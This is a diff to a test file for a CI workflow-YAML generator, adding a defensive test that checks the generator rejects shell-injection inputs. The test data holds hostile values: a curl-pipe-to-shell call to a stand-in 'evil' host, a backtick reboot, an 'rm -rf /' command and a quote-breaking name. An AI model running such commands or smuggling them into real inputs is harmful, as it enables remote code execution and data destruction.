@@ -47,4 +47,18 @@ describe('ci init: buildWorkflowYaml', () => {
     // Drift gate still present for any source.
     expect(y).toContain('git status --porcelain "./s"');
   });
+
+  it('rejects shell-injection payloads in inputs', () => {
+    const base = {
+      spec: 'api.yaml',
+      output: './server',
+      source: 'openapi' as const,
+      transport: 'stdio' as const,
+      version: 'latest',
+    };
+    expect(() => buildWorkflowYaml({ ...base, spec: '$(curl evil|sh)' })).toThrow(/Unsafe/);
+    expect(() => buildWorkflowYaml({ ...base, output: '`reboot`' })).toThrow(/Unsafe/);
+    expect(() => buildWorkflowYaml({ ...base, version: '; rm -rf / #' })).toThrow(/Unsafe/);
+    expect(() => buildWorkflowYaml({ ...base, name: 'a"; evil; "' })).toThrow(/Unsafe/);
+  });
 });
